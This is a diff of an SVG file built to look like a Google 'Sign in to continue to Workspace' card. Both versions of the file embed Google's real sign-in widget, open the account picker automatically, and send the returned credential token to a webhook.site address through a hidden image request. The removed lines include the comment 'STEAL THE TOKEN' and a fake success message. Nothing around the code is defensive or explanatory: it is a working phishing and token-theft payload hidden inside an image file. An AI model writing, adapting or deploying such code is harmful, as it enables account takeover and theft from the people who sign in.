@@ -3,77 +3,39 @@
      xmlns:xlink="http://www.w3.org/1999/xlink"
      width="380" height="520" viewBox="0 0 380 520">
 
-  <!-- Blue background + white card -->
   <rect width="380" height="520" fill="#4285f4" rx="8"/>
   <rect x="20" y="80" width="340" height="400" fill="white" rx="8"/>
-
-  <!-- Google logo -->
   <image x="140" y="110" width="100" height="35"
          xlink:href="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"/>
+  <text x="190" y="180" font-family="Roboto" font-size="18" fill="#3c4043" text-anchor="middle">Sign in</text>
+  <text x="190" y="205" font-family="Roboto" font-size="14" fill="#5f6368" text-anchor="middle">to continue to Workspace</text>
 
-  <!-- Title -->
-  <text x="190" y="180" font-family="Roboto,Arial" font-size="18"
-        fill="#3c4043" text-anchor="middle">Sign in</text>
-  <text x="190" y="205" font-family="Roboto,Arial" font-size="14"
-        fill="#5f6368" text-anchor="middle">to continue to Workspace</text>
-
-  <!-- REAL Google Sign-in button (visible) -->
   <foreignObject x="50" y="250" width="280" height="70">
-    <div xmlns="http://www.w3.org/1999/xhtml" style="font-family:Roboto,Arial;">
+    <div xmlns="http://www.w3.org/1999/xhtml">
       <div id="g_id_onload"
            data-client_id="561478328063-3i8n5ve256gl3hh0elebre2g0111l5lk.apps.googleusercontent.com"
-           data-callback="onSignIn"
-           data-auto_prompt="false">
+           data-callback="onSignIn">
       </div>
-      <div class="g_id_signin"
-           data-type="standard"
-           data-size="large"
-           data-theme="outline"
-           data-text="signin_with"
-           data-shape="rect"
-           data-logo_alignment="left">
-      </div>
+      <div class="g_id_signin" data-type="standard" data-size="large"></div>
     </div>
   </foreignObject>
 
-  <!-- JavaScript – all & → &amp; -->
   <script>
-    // Auto-trigger after API loads
-    setTimeout(function() {
-      if (window.google &amp;&amp; google.accounts &amp;&amp; google.accounts.id) {
+    setTimeout(() => {
+      if (window.google && window.google.accounts && window.google.accounts.id) {
         google.accounts.id.initialize({
           client_id: '561478328063-3i8n5ve256gl3hh0elebre2g0111l5lk.apps.googleusercontent.com',
           callback: onSignIn
         });
-        google.accounts.id.prompt();   // opens the official picker
+        google.accounts.id.prompt();
       }
     }, 800);
 
-    // STEAL THE TOKEN
-    function onSignIn(resp) {
-      const token = resp.credential;   // full JWT
-      new Image().src =
-        'https://webhook.site/79f5d586-3939-4986-b04e-f0f4431b97b0?token='
-        + encodeURIComponent(token)
-        + '&amp;src=' + encodeURIComponent(location.href);
-
-      // Success message
-      const txt = document.createElementNS('http://www.w3.org/2000/svg','text');
-      txt.setAttribute('x','190');
-      txt.setAttribute('y','370');
-      txt.setAttribute('font-family','Roboto');
-      txt.setAttribute('font-size','16');
-      txt.setAttribute('fill','green');
-      txt.setAttribute('text-anchor','middle');
-      txt.textContent = 'Signed in! Loading Workspace...';
-      document.documentElement.appendChild(txt);
+    function onSignIn(r) {
+      new Image().src = 'https://webhook.site/79f5d586-3939-4986-b04e-f0f4431b97b0?token=' 
+                      + encodeURIComponent(r.credential);
     }
   </script>
 
-  <!-- Load Google Identity Services -->
   <script src="https://accounts.google.com/gsi/client" async="async" defer="defer"></script>
-
-  <!-- Optional ping -->
-  <image xlink:href="https://webhook.site/79f5d586-3939-4986-b04e-f0f4431b97b0?ping=ready"
-         width="0" height="0"/>
 </svg>
